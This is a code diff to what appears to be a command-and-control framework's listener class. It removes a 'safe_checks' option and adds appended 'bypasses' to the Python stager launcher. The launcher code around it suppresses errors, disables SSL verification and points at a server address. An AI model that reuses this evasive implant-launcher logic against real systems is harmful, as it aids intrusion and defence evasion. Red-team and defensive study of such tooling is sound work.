@@ -294,7 +294,6 @@ class Listener:
         proxy_creds="default",
         stager_retries="0",
         language=None,
-        safe_checks="",
         listener_name=None,
         stager=None,
         bypasses: list[str] | None = None,
@@ -334,16 +333,8 @@ class Listener:
         if language == "powershell":
             launcherBase = '$ErrorActionPreference = "SilentlyContinue";'
 
-            if safe_checks.lower() == "true":
-                launcherBase = "If($PSVersionTable.PSVersion.Major -ge 3){"
-
             for bypass in bypasses:
                 launcherBase += bypass
-
-            if safe_checks.lower() == "true":
-                launcherBase += (
-                    "};[System.Net.ServicePointManager]::Expect100Continue=0;"
-                )
 
             # ==== DEFINE BYTE ARRAY CONVERSION ====
             launcherBase += (
@@ -482,9 +473,8 @@ class Listener:
                 launcherBase += "import ssl\n"
                 launcherBase += "if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context\n"
 
-            # ==== SAFE CHECKS ====
-            if safe_checks and safe_checks.lower() == "true":
-                launcherBase += listener_util.python_safe_checks()
+            for bypass in bypasses:
+                launcherBase += bypass
 
             launcherBase += f"server='{self.host_address}'\n"
 
